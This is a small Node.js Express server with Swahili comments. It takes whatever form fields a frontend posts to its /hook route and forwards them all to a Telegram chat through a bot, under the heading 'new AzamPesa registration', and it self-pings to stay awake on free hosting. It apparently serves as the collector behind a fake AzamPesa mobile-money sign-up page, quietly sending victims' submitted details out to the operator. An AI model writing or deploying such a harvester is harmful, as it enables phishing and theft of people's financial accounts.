const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// Soma BOT TOKEN na CHAT ID kutoka env
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

// Hakikisha zipo
if (!botToken || !chatId) {
  console.error("BOT_TOKEN or CHAT_ID missing from environment variables.");
  process.exit(1);
}

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Root route (keep alive or health check)
app.get("/", (req, res) => {
  res.send("Webhook server is live.");
});

// Hook route for receiving data from frontend
app.post("/hook", async (req, res) => {
  const data = req.body;

  let message = "📥 Kuna usajili mpya wa AzamPesa!\n\n";
  for (let key in data) {
    message += `${key.toUpperCase()}: ${data[key]}\n`;
  }

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    res.status(200).json({ status: "success" });
  } catch (error) {
    console.error("Telegram Error:", error.message);
    res.status(500).json({ status: "error", message: "Telegram failed" });
  }
});

// Self ping to keep Render awake
setInterval(() => {
  axios.get("https://your-render-url.onrender.com/")
    .then(() => console.log("Self-ping successful"))
    .catch(err => console.error("Self-ping failed:", err.message));
}, 1000 * 60 * 14); // Every 14 mins

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});